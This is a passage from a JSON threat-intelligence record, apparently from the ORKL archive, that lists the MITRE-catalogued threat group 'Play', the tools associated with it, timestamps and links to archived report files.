            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1422833069,
    "ts_modification_date": 1422833095,
    "files": {
        "pdf": "https://archive.orkl.eu/4751fe686fb4e305ef49296f46ac33139114232b.pdf",
        "text": "https://archive.orkl.eu/4751fe686fb4e305ef49296f46ac33139114232b.txt",
        "img": "https://archive.orkl.eu/4751fe686fb4e305ef49296f46ac33139114232b.jpg"
    }
}